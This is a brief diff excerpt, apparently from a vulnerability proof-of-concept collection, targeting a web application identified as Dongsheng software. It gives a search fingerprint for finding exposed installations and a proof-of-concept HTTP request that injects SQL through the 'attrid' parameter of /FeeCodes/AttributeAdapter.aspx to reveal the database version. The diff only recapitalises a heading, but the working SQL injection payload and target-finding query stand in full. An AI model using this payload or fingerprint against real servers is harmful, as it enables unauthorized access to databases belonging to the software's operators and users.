@@ -8,7 +8,7 @@
 body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /FeeCodes/AttributeAdapter.aspx?handle=attrinfo&attrid=1%27%20and%201=@@version%20-- HTTP/1.1
